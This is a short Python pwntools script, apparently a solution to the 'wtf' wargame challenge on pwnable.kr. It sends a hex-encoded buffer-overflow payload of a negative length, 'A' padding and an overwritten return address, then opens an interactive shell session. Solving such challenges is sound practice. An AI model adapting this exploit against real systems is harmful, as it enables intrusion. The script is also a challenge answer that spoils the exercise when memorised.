from pwn import *


class WtfExploit(object):

    PAYLOAD = "2d310a" + 4093 * "41" + 56 * "41" + "f805400000000000" + "0a"

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9015)

    def run(self):
        print(self.shell.recvuntil("please : "))
        self.shell.sendline(self.PAYLOAD)
        self.shell.interactive()


if __name__ == '__main__':
    WtfExploit().run()
